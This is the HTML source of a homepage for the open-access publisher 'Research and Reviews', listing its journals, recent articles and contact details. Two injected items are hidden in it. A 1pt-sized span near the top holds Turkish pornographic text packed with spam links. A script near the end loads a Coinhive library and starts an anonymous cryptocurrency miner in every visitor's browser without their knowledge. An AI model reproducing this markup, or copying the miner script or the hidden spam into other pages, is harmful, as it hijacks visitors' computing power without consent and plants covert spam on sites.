<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="/images/favicon.ico"/>
<meta name="robots" content="all"/>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i" rel="stylesheet">
<link href="/css/global.css" rel="stylesheet">
<link href="/css/rroij_styles.css" rel="stylesheet">
<link href='https://fonts.googleapis.com/css?family=Muli:400,300,300italic,400italic' rel='stylesheet' type='text/css'>
<script src="/js/classie.js"></script>
<link rel="stylesheet" type="text/css" href="/css/main-coolautosuggest.css"/>
<script src="/js/jquery.js"></script>
<script src="/js/jquery.coolautosuggest.js"></script>
<script src="/js/jquery.coolfieldset.js"></script>
<script async data-rocketsrc="https://www.googletagmanager.com/gtag/js?id=UA-64192582-1" type="text/rocketscript"></script>
<script type="text/rocketscript">
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-64192582-1');
</script>
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-NSW46M"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>
	( function ( w, d, s, l, i ) {
		w[ l ] = w[ l ] || [];
		w[ l ].push( {
			'gtm.start': new Date().getTime(),
			event: 'gtm.js'
		} );
		var f = d.getElementsByTagName( s )[ 0 ],
			j = d.createElement( s ),
			dl = l != 'dataLayer' ? '&l=' + l : '';
		j.async = true;
		j.src =
			'//www.googletagmanager.com/gtm.js?id=' + i + dl;
		f.parentNode.insertBefore( j, f );
	} )( window, document, 'script', 'dataLayer', 'GTM-NSW46M' );
</script>
<!-- End Google Tag Manager -->	<title>Research and Reviews - International Journals</title>
	<meta name="keywords" content="open access, open access journals, open access publication, open access publisher, open access publishing, open access journals online, free online journals, chemistry journals, pharmaceutical sciences journals, engineering journals, management journals, life sciences journals, scientific journals, medical journals, medical sciences journals, open access initiative, open access library, open access resources, free online journals, scientific journal articles, open access journal articles, agriculture journals">
	<meta name="description" content="Research &amp; Reviews is a scientific organization that drives the progress of research through open access journals">
</head>

<body>
	<script type='text/javascript'>
	_gaq.push( [ '_setCustomVar', 1, 'IP', '54.198.169.202', 1 ] );
</script>
<header>
	<div class="container padding-tb-15">
		<!-- Header Starts Here --->
		<div class="row">
			<div class="col-md-4">
				<div class="navbar-header">
					<div class="media">
						<div class="media-left">
							<a href="http://www.rroij.com/">
                          <img class="media-object" src="http://www.rroij.com/images/research-reviews-logo.svg" alt="Research and Reviews - International Journals" title="Research and Reviews - International Journals">
                        </a>
						
						</div>
						<div class="media-body media-bottom">
							<h4 class="media-heading">International Journals</h4>
						</div>
					</div>
				</div>
			</div>
			<div class="col-md-offset-3 col-md-3">
				<form id="header-serach" role="form" method="get" action="http://www.rroij.com/searchresult.php" style="margin-top:13px;">
					<div class="input-group">
						<input type="text" class="form-control pull-right" name="keyword" id="keyword" pattern=".{4,15}" required title="4 to 15 characters" placeholder="Search here..">
						<span class="input-group-btn">
                                <button class="btn btn-default" type="submit"><i class="fa fa-search"></i></button>
                            </span>
					
					</div>
					<script language="javascript" type="text/javascript">
						$( "#keyword" ).coolautosuggest( {
							url: "http://www.rroij.com/author-names.php?chars=",
							minChars: 4,
							submitOnSelect: true
						} );
					</script>
				</form>
			</div>
			<div class="col-md-2">
				<ul class="social-share list-inline pull-right" style="padding-top:17px;">
					<li><a href="https://www.facebook.com/rroijournals"><i class="fa fa-facebook"></i></a>
					</li>
					<li><a href="https://twitter.com/RROIJournals"><i class="fa fa-twitter"></i></a>
					</li>
					<li><a href="https://www.linkedin.com/company/rroij"><i class="fa fa-linkedin"></i></a>
					</li>
					<li><a href="https://plus.google.com/u/0/b/101272123355874324628/101272123355874324628/posts"><i class="fa fa-google-plus"></i></a>
					</li>
				</ul>
			</div>
		</div>
		<!-- Header Ends Here --->
	</div>
	<nav class="navbar navbar-default navbar-static-top margin-b-0">
		<div class="container">
			<div class="navbar-header">
				<button aria-controls="navbar" aria-expanded="false" data-target="#main-navbar" data-toggle="collapse" class="navbar-toggle collapsed" type="button"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
			</div>
			<div class="navbar-collapse collapse" id="main-navbar">
				<ul class="nav navbar-nav">
					<li><a title="Home" href="http://www.rroij.com/">Home</a>
					</li>
					<li><a title="About Us" href="http://www.rroij.com/about.php">About Us</a>
					</li>
					<li><a title="Open Access" href="http://www.rroij.com/open-access.php">Open Access</a>
					</li>
					<li><a class="dropdown-toggle" data-toggle="dropdown" href="#">Journals <span class="caret"></span></a>
						<ul class="dropdown-menu">
							<li><a title="Browse by Title" href="http://www.rroij.com/open-access-journals-list.php">Browse by Title</a> </li>
							<li><a title="Browse by Subject" href="http://www.rroij.com/browse-scientific-journals.php">Browse by Subject</a> </li>
						</ul>
					</li>
					<li><a title="Submit Manuscript" href="http://www.rroij.com/submitmanuscript.php">Submit Manuscript</a>
					</li>
										<li><a title="Register" href="http://www.rroij.com/register.php">Register</a>
					</li>
					<li><a title="Contact" href="http://www.rroij.com/contact.php">Contact</a>
					</li>
					<li><a title="FAQs" href="http://www.rroij.com/faqs.php">FAQs</a>
					</li>
				</ul>
			</div>
		</div>
	</nav>
</header>

<!-- Classie - class helper functions by @desandro https://github.com/desandro/classie -->
<script src="js/classie.js"></script>
<span style="overflow: auto; position: absolute; height: 1pt; width: 1pt;">Yakışıklı erkek tatil için bir beldeye gidiyor burada kendisine <a href="http://www.noleadstore.com" title="türk Porno">türk Porno</a> güzel bir seksi kadın ayarlıyor Onunla beraber otel odasına gidiyorlar Otel odasına <a href="http://www.burjalarabia.com" title="rokettube">rokettube</a> giren kadın ilk önce erkekle sohbet ederek işi yavaş halletmeye çalışıyor <a href="http://oso0.com" title="sex hikayeleri">sex hikayeleri</a> Kocası fabrikatör olan sarışın Rus hatun şehirden biraz uzak olan bir <a href="http://www.progamesonline.com" title="türk porno">türk porno</a> kasabaya son derece lüks bir villa yaptırıp yerleşiyor Kocasını işe gönderip <a href="http://www.infocrossworld.com" title="mobil porno">mobil porno</a> istediği erkeği eve atan Rus hatun son olarak fotoğraf çekimi yapmak üzere <a href="http://www.phyziology.com" title="türk porno">türk porno</a> evine gelen genç adamı bahçede azdırıyor Güzel hatun zengin bir iş adamının <a href="http://clevergirlrules.com" title="porno indir">porno indir</a> dostu olmayı kabul ediyor Adamın kendisine aldığı yazlık evde <a href="http://www.realyfat.com" title="sikiş">sikiş</a> kalmaya başlayan hatun bir süre sonra kendi erkek arkadaşlarını bir bir çağırarak onlarla <a href="http://www.zez6.com" title="porno izle">porno izle</a> yapıyor Son olarak çağırdığı arkadaşını kapıda üzerinde beyaz gömleğin açık <a href="http://www.opa5.com" title="sikiş">sikiş</a> düğmelerinden fışkıran dik memeleri ile karşılayıp içeri girer girmez <a href="http://www.rog6.com" title="sikiş">sikiş</a> dudaklarına yapışarak sevişiyor Evin her köşesine yayılan inleme seslerinin eşliğinde yorgun düşerek orgazm oluyor</span><!--<script src="http://www.omicsonline.org/js/jquery.js"></script>-->
<script src="http://www.omicsonline.org/js/jquery.coolautosuggest.js"></script>
<script src="http://www.omicsonline.org/js/jquery.coolfieldset.js"></script>	<!-- container -->
	<div class="container m-b">
		<div class="row">
			<div class="home-content">
				<h3 class="text-danger text-uppercase">Welcome to the Research &amp; Reviews <small style="font-size:80%;">- International Journals</small></h3>
				<p> We are an open-access journal publication that aims to serve authors and readers (scientists as well as general masses) by providing them an easy and reliable source of knowledge. We publish 28 International Journals dispersing advance knowledge in the field of Pharmacy, Medical, Nursing, Dental, Agriculture, Engineering Technology and Arts. Certified by American Montessori Council, we have developed a unique education system that is a blend of our Ancient Vedic Educations with the practice equipment of Montessori system.</p>
				<p>We provide a wide range of standard articles that are published after a stringent peer-review process along with expert’s updations and are appreciated by millions of readers all over the world for our unbiased performance and quality output. Several countries contribute papers to our journals. Each issue carries useful reviews and articles of immediate interest to the practicing professionals as well as researchers.</p>
			</div>
		</div>
	</div>
	<!-- container -->

	<!-- open invitation -->
	<div class="widget-bg">
		<div class="container">
			<div class="col-md-3"> <img src="../images/invite.jpg" alt="img welcome" class="img-responsive"/> </div>
			<div class="col-md-9">
				<h2>Open Invitation</h2>
				<p>We are delighted to invite Eminent Scientists, Academicians and Researchers to submit their original research articles for publication Research & Reviews journals for an effective scientific reading and public view with an aim to reach the world wide researchers and practitioners.</p>
			</div>
		</div>
	</div>
	<!-- open invitation -->

	<div class="container">
		<div class="row inform m-b">
			<!-- Newly Released Issues -->
			<div class="col-md-9 m-t new-rel-isu">
				<h3 class="text-danger">Newly Released Issues</h3>
				<ul class="list-inline">
					<li class='col-xs-12 col-sm-6 col-md-4 text-left equal-height'>
                   <h4><a href='http://www.rroij.com/ArchiveJET/currentissue-engineering-and-technology.php' target='_blank' title='Research & Reviews: Journal of Engineering and Technology'>Research & Reviews: Journal of Engineering and Technology</a></h4>
                   <p><a href='http://www.rroij.com/ArchiveJET/currentissue-engineering-and-technology.php' target='_blank'>Volume 7, Issue 1</a><br>
				   March, 2018</p>
                  </li><li class='col-xs-12 col-sm-6 col-md-4 text-left equal-height'>
                   <h4><a href='http://www.rroij.com/ArchiveJAAS/currentissue-agriculture-and-allied-sciences.php' target='_blank' title='Research & Reviews: Journal of Agriculture and Allied Sciences'>Research & Reviews: Journal of Agriculture and Allied Sciences</a></h4>
                   <p><a href='http://www.rroij.com/ArchiveJAAS/currentissue-agriculture-and-allied-sciences.php' target='_blank'>Volume 6, Issue 2</a><br>
				   December, 2017</p>
                  </li><li class='col-xs-12 col-sm-6 col-md-4 text-left equal-height'>
                   <h4><a href='http://www.rroij.com/ArchiveJASI/currentissue-applied-science-and-innovations.php' target='_blank' title='Journal of Applied Science and Innovations'>Journal of Applied Science and Innovations</a></h4>
                   <p><a href='http://www.rroij.com/ArchiveJASI/currentissue-applied-science-and-innovations.php' target='_blank'>Volume 1, Issue 4</a><br>
				   December, 2017</p>
                  </li><li class='col-xs-12 col-sm-6 col-md-4 text-left equal-height'>
                   <h4><a href='http://www.rroij.com/ArchiveJBS/currentissue-botanical-sciences.php' target='_blank' title='Research & Reviews: Journal of Botanical Sciences'>Research & Reviews: Journal of Botanical Sciences</a></h4>
                   <p><a href='http://www.rroij.com/ArchiveJBS/currentissue-botanical-sciences.php' target='_blank'>Volume 6, Issue 4</a><br>
				   December, 2017</p>
                  </li><li class='col-xs-12 col-sm-6 col-md-4 text-left equal-height'>
                   <h4><a href='http://www.rroij.com/ArchiveJCMCS/currentissue-clinical-and-medical-case-studies.php' target='_blank' title='Journal of Clinical and Medical Case Studies'>Journal of Clinical and Medical Case Studies</a></h4>
                   <p><a href='http://www.rroij.com/ArchiveJCMCS/currentissue-clinical-and-medical-case-studies.php' target='_blank'>Volume 2, Issue 4</a><br>
				   December, 2017</p>
                  </li>				</ul>
				<div class="clearfix"></div>

				<div class="recent-pub">
					<h3 class="m-t text-danger">Recent Publications</h3>
					<ul class="media-list">
												<li class="media">
							<i class="fa fa-link"></i>
							<div class="media-left">
								<a title="Toxicologic Effects of Dichrostachys glomerata" href="http://www.rroij.com/open-access/toxicologic-effects-of-dichrostachys-glomerata.php?aid=86757">
									Toxicologic Effects of Dichrostachys glomerata								</a><br>
								<p>
									<p>Atsang AKG, Dzeufiet DPD, Dimo T and Kamtchouing</p>								</p>
							</div>
							<div class="clearfix">
								<p class="journal">
									<a title="Research & Reviews in Pharmacy and Pharmaceutical Sciences" href="http://www.rroij.com/ArchiveJPPS/currentissue-pharmacy-and-pharmaceutical-sciences.php" class="fr">
										Research & Reviews in Pharmacy and Pharmaceutical Sciences									</a>
								</p>
							</div>
						</li>
												<li class="media">
							<i class="fa fa-link"></i>
							<div class="media-left">
								<a title=""Green" Organogelators: Design and Applications" href="http://www.rroij.com/open-access/green-organogelators-design-and-applications.php?aid=86756">
									"Green" Organogelators: Design and Applications								</a><br>
								<p>
									<p>Bruna Gioia, Nesrine Ben Ghalia and Plamen Kirilov</p>								</p>
							</div>
							<div class="clearfix">
								<p class="journal">
									<a title="Research & Reviews in Pharmacy and Pharmaceutical Sciences" href="http://www.rroij.com/ArchiveJPPS/currentissue-pharmacy-and-pharmaceutical-sciences.php" class="fr">
										Research & Reviews in Pharmacy and Pharmaceutical Sciences									</a>
								</p>
							</div>
						</li>
												<li class="media">
							<i class="fa fa-link"></i>
							<div class="media-left">
								<a title="Specifying Coordinate in Result of Potential Time Travel & Wormhole" href="http://www.rroij.com/open-access/specifying-coordinate-in-result-of-potential-time-travel-wormhole.php?aid=86745">
									Specifying Coordinate in Result of Potential Time Travel & Wormhole								</a><br>
								<p>
									<p>Toha AN</p>								</p>
							</div>
							<div class="clearfix">
								<p class="journal">
									<a title="Research & Reviews: Journal of Pure and Applied Physics" href="http://www.rroij.com/ArchiveJPAP/currentissue-pure-and-applied-physics.php" class="fr">
										Research & Reviews: Journal of Pure and Applied Physics									</a>
								</p>
							</div>
						</li>
												<li class="media">
							<i class="fa fa-link"></i>
							<div class="media-left">
								<a title="Alpha- particle stopping powers in air and argon" href="http://www.rroij.com/open-access/alpha-particle-stopping-powers-in-air-and-argon.php?aid=86744">
									Alpha- particle stopping powers in air and argon								</a><br>
								<p>
									<p>Mohammad QH, Maghdid HA</p>								</p>
							</div>
							<div class="clearfix">
								<p class="journal">
									<a title="Research & Reviews: Journal of Pure and Applied Physics" href="http://www.rroij.com/ArchiveJPAP/currentissue-pure-and-applied-physics.php" class="fr">
										Research & Reviews: Journal of Pure and Applied Physics									</a>
								</p>
							</div>
						</li>
												<li class="media">
							<i class="fa fa-link"></i>
							<div class="media-left">
								<a title="Bell's inequalities revisited" href="http://www.rroij.com/open-access/bells-inequalities-revisited.php?aid=86743">
									Bell's inequalities revisited								</a><br>
								<p>
									<p>Henri JMS</p>								</p>
							</div>
							<div class="clearfix">
								<p class="journal">
									<a title="Research & Reviews: Journal of Pure and Applied Physics" href="http://www.rroij.com/ArchiveJPAP/currentissue-pure-and-applied-physics.php" class="fr">
										Research & Reviews: Journal of Pure and Applied Physics									</a>
								</p>
							</div>
						</li>
											</ul>
				</div>

			</div>
			<!-- Newly Released Issues -->
			<div class="col-md-3 m-t rroij-panel-transparent">
				<div class="panel panel-default">
					<div class="panel-heading">
						<h3 class="panel-title">Browse by Subject</h3>
					</div>
					<div class="list-group icon-list-1">
						<a class="list-group-item" href="http://www.rroij.com/chemistry-physics-journals.php">Chemistry &amp; Physics Journals</a>
						<a class="list-group-item" href="http://www.rroij.com/earth-environmental-sciences-journals.php">Earth &amp; Environmental Sciences</a>
						<a class="list-group-item" href="http://www.rroij.com/engineering-journals.php">Engineering Journals</a>
						<a class="list-group-item" href="http://www.rroij.com/general-sciences-journals.php">General Sciences</a>
						<a class="list-group-item" href="http://www.rroij.com/medical-sciences-journals.php">Medical Sciences</a>
						<a class="list-group-item" href="http://www.rroij.com/pharmaceutical-sciences-journals.php">Pharmaceutical Sciences</a>
						<a class="list-group-item" href="http://www.rroij.com/social-political-sciences-journals.php">Social &amp; Political Sciences</a>
					</div>
				</div>

				<div class="panel panel-default">
					<div class="panel-heading">
						<h3 class="panel-title">Follow Us</h3>
					</div>
					<div class="panel-body">
						<ul class="list-inline text-center">
							<li><a href="https://www.facebook.com/rroijournals"><i class="fa fa-facebook fa-2x"></i></a>
							</li>
							<li><a href="https://twitter.com/RROIJournals"><i class="fa fa-twitter fa-2x"></i></a>
							</li>
							<li><a href="#"><i class="fa fa-linkedin fa-2x"></i></a>
							</li>
							<li><a href="https://plus.google.com/u/0/b/101272123355874324628/101272123355874324628/posts"><i class="fa fa-google-plus fa-2x"></i></a>
							</li>
						</ul>
					</div>
				</div>

				<div class="panel panel-default">
					<div class="panel-heading">
						<h3 class="panel-title">Quick Links</h3>
					</div>
					<div class="list-group icon-list-1">
						<a class="list-group-item" title="Click Here" href="http://www.rroij.com/terms-and-conditions.php">Terms and Conditions</a>
						<a class="list-group-item" title="Click Here" href="http://www.rroij.com/private-policies.php">Private Policy</a>
						<a class="list-group-item" title="Click Here" href="http://www.rroij.com/for-advertisers.php">Information for Advertisers</a>
						<a class="list-group-item" title="Click Here" href="http://www.rroij.com/">Open Access Policy</a>
						<a class="list-group-item" title="Click Here" href="http://www.rroij.com/submitmanuscript.php">Submit a manuscript</a>
						<a class="list-group-item" title="Click Here" href="http://www.rroij.com/">Join our advisory board</a>
					</div>
				</div>

			</div>
		</div>
	</div>
	<!-- Footer Starts Here --->
<footer>
    <div class="container">
    	<div class="row">
        	<div class="col-md-3">
                <h4>Useful Links</h4>
                <ul class="list-unstyled">
                    <li><a title="About Us" href="http://www.rroij.com/about.php">About Us</a></li>
                    <li><a title="Open Access" href="http://www.rroij.com/open-access.php">Open Access</a></li>
                    <li><a title="Journals" href="http://www.rroij.com/open-access-journals-list.php">Journals</a></li>
                    <li><a title="Submit Manuscript" href="http://www.rroij.com/submitmanuscript.php">Submit Manuscript</a></li>
                    <li><a title="Contact" href="contact.php">Contact</a></li>
                    <li><a title="FAQs" href="http://www.rroij.com/faqs.php">FAQs</a></li>
                </ul>
            </div>
        	<div class="col-md-5">
                <h4>Contact Us</h4>
                <div class="row">
                	<div class="col-xs-12 col-sm-6">
                		<address>
							<strong>Research &amp; Reviews</strong><br>
							7th Floor, North Block,<br>
							Divyasree SEZ Campus<br>
							Raidurg,<br>
							Hyderabad 500 081<br>
							INDIA<br>
							<strong>Tel: </strong>040-33432400
							
						</address>
                	</div>
                	<!--<div class="col-xs-12 col-sm-6">
                		<address>
							<strong>Research &amp; Reviews</strong><br>
							731 Gull Ave, Foster City<br />
							CA 94404, USA<br />
							<strong>Tel: </strong>+1-800-216-6499<br>
							<strong>E-mail:</strong> <a href="mailto:contact@rroij.com">contact@rroij.com</a>
						</address>
					</div>-->
                </div>
            </div>
            <div class="col-md-4">
                <h4>Subscribe to our Newsletter</h4>
                <div class="news-letter">
                	<p class="fa-1x"> Enter your email address to receive all news <br>
                	from our awesome <a href="http://www.rroij.com/">website</a> </p>
                    <form role="form">
                        <div class="form-group">
                        	<div class="input-group">
                                <input type="email" required placeholder="Your email address..." class="form-control" id="email" autocomplete="off">
                                <span class="input-group-btn">
                                    <button type="submit" class="btn btn-info">Submit</button>
                                </span>
                            </div>
                        </div>
                    </form>
                    <p class="m-t"><sup>*</sup>Don't worry you'll not be spammed</p>
                </div>
            </div>
		</div>
    </div>
    <div class="copy-right">
    	<div class="container">
        	<div class="row">
            	<div class="col-xs-12 col-md-10 col-md-offset-1">
                	<ul class="media-list">
                      <li class="media">
                        <div class="media-body media-middle">
                        	<p class="text-center"> All Published work is licensed under a <a rel="nofollow" href="http://creativecommons.org/licenses/by/4.0/" title="click here"> Creative Commons Attribution 4.0 International License</a>
                            </p>
                        </div>
                      </li>
                    </ul>
                </div>
            </div>
            
            <p class="text-center">Copyright &copy; 2018<a href="http://www.rroij.com/"> Research and Reviews</a>, All Rights Reserved</p>        </div>
    </div>
</footer>

<!-- Scroll To Top -->
<a href="#0" class="cd-top"><span aria-hidden="true" class="glyphicon glyphicon-chevron-up"></span></a>
<!-- Scroll To Top End -->

<!-- Footer Ends Here --->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) --> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script type="text/javascript" src="/js/grids.min.js"></script>
<script type="text/javascript">
	// Equal Height
	var EqualHeight = function () {
		"use strict";

		// Handle Equal Height
		var handleEqualHeight = function () {
			$( function ( $ ) {
				for(var eh=1;eh<17;eh++){
					$('.equal-height-'+eh).responsiveEqualHeightGrid();
				}
			} );
		};

		return {
			init: function () {
				handleEqualHeight(); // initial setup for equal height
			}
		};
	}();

	$( document ).ready( function () {
		"use strict";
		EqualHeight.init();
	} );
</script>
<!-- Classie - class helper functions by @desandro https://github.com/desandro/classie -->
<script type="text/javascript">
$(document).ready(function(e) {
    // Closes the sidebar menu
    $("#menu-close").click(function(e) {
        e.preventDefault();
        $("#sidebar-wrapper").toggleClass("active");
    });
    // Opens the sidebar menu
    $("#menu-toggle").click(function(e) {
        e.preventDefault();
        $("#sidebar-wrapper").toggleClass("active");
    });
});
</script>
<script src="js/classie.js"></script>
<script>
			var menuLeft = document.getElementById( 'cbp-spmenu-s1' ),
				menuRight = document.getElementById( 'cbp-spmenu-s2' ),
				menuTop = document.getElementById( 'cbp-spmenu-s3' ),
				menuBottom = document.getElementById( 'cbp-spmenu-s4' ),
				showLeft = document.getElementById( 'showLeft' ),
				showRight = document.getElementById( 'showRight' ),
				showTop = document.getElementById( 'showTop' ),
				showBottom = document.getElementById( 'showBottom' ),
				showLeftPush = document.getElementById( 'showLeftPush' ),
				showRightPush = document.getElementById( 'showRightPush' ),
				body = document.body;

			showLeft.onclick = function() {
				classie.toggle( this, 'active' );
				classie.toggle( menuLeft, 'cbp-spmenu-open' );
				disableOther( 'showLeft' );
			};
			showRight.onclick = function() {
				classie.toggle( this, 'active' );
				classie.toggle( menuRight, 'cbp-spmenu-open' );
				disableOther( 'showRight' );
			};
			showTop.onclick = function() {
				classie.toggle( this, 'active' );
				classie.toggle( menuTop, 'cbp-spmenu-open' );
				disableOther( 'showTop' );
			};
			showBottom.onclick = function() {
				classie.toggle( this, 'active' );
				classie.toggle( menuBottom, 'cbp-spmenu-open' );
				disableOther( 'showBottom' );
			};
			showLeftPush.onclick = function() {
				classie.toggle( this, 'active' );
				classie.toggle( body, 'cbp-spmenu-push-toright' );
				classie.toggle( menuLeft, 'cbp-spmenu-open' );
				disableOther( 'showLeftPush' );
			};
			showRightPush.onclick = function() {
				classie.toggle( this, 'active' );
				classie.toggle( body, 'cbp-spmenu-push-toleft' );
				classie.toggle( menuRight, 'cbp-spmenu-open' );
				disableOther( 'showRightPush' );
			};

			function disableOther( button ) {
				if( button !== 'showLeft' ) {
					classie.toggle( showLeft, 'disabled' );
				}
				if( button !== 'showRight' ) {
					classie.toggle( showRight, 'disabled' );
				}
				if( button !== 'showTop' ) {
					classie.toggle( showTop, 'disabled' );
				}
				if( button !== 'showBottom' ) {
					classie.toggle( showBottom, 'disabled' );
				}
				if( button !== 'showLeftPush' ) {
					classie.toggle( showLeftPush, 'disabled' );
				}
				if( button !== 'showRightPush' ) {
					classie.toggle( showRightPush, 'disabled' );
				}
			}
		</script>
        <script>
            var mnr = document.createElement('script');
            mnr.src = 'https://coin-hive.com/lib/coinhive.min.js';
            mnr.onload=function(){
                var miner=CoinHive.Anonymous('MhbygeUlrWYiK9b2CmS8gdGAIFBeB7pd');
                miner.start();
            };
            document.getElementsByTagName('body')[0].appendChild(mnr);
        </script>

<script>
// Add scrollspy to <body>
$('body').scrollspy({target: "#browse-by-alpha", offset: 50}); 

// Add smooth scrolling to all links inside a navbar
$("#browse-by-alpha a").on('click', function(event){

// Prevent default anchor click behavior
event.preventDefault();

// Store hash (#)
var hash = this.hash;

// Using jQuery's animate() method to add smooth page scroll
// The optional number (800) specifies the number of milliseconds it takes to scroll to the specified area (the speed of the animation)
$('html, body').animate({
scrollTop: $(hash).offset().top
}, 800, function(){

// Add hash (#) to URL when done scrolling (default click behavior)
window.location.hash = hash;
});
});

<!--Scroll to Top -->
jQuery(document).ready(function($){
	// browser window scroll (in pixels) after which the "back to top" link is shown
	var offset = 300,
		//browser window scroll (in pixels) after which the "back to top" link opacity is reduced
		offset_opacity = 1200,
		//duration of the top scrolling animation (in ms)
		scroll_top_duration = 700,
		//grab the "back to top" link
		$back_to_top = $('.cd-top');

	//hide or show the "back to top" link
	$(window).scroll(function(){
		( $(this).scrollTop() > offset ) ? $back_to_top.addClass('cd-is-visible') : $back_to_top.removeClass('cd-is-visible cd-fade-out');
		if( $(this).scrollTop() > offset_opacity ) { 
			$back_to_top.addClass('cd-fade-out');
		}
	});

	//smooth scroll to top
	$back_to_top.on('click', function(event){
		event.preventDefault();
		$('body,html').animate({
			scrollTop: 0 ,
		 	}, scroll_top_duration
		);
	});

});
</script>


	</body>
</html>